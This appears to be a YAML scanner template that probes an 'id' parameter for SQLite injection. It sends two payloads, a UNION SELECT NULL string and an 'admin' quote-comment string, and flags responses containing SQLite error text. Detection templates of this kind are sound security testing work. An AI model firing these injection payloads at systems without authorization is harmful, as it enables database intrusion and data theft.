id: sqli6-sqlite-11
name: 'SQLi sqlite probe in id'
severity: high
type: active
tags:
  - sqli
  - injection
  - sqlite
description: 'Triggers sqlite error via id'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      id:
        - ''' UNION SELECT NULL--'
        - 'admin"--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'SQLite'
          - 'sqlite3'
